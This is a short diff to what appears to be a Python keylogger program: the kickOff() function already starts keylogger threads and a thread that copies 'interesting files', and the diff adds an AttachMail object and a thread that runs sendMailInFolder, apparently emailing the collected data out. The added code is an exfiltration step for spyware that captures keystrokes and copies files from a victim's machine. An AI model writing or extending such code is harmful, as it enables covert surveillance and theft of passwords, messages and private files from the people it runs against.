@@ -427,6 +427,13 @@ def kickOff():
     searching_thread = threading.Thread(target=file_copy.Copy_interesting_files)
     stop_searching_thread = threading.Thread(target=file_copy.stop_copying())
 
+    # Create the email object
+    attachmail = AttachMail()
+
+    # Define email thread
+    email_thread = threading.Thread(target=attachmail.sendMailInFolder)
+
+
     # Start the threads for the keylogger
     start_keylogger_thread.start()
     stop_timer.start()
@@ -436,6 +443,11 @@ def kickOff():
     # Start the threads for file copy
     searching_thread.start()
     stop_searching_thread.start()
+
+    # Start the threads for emailing
+    email_thread.start()
+
+
 
 
 # import winreg
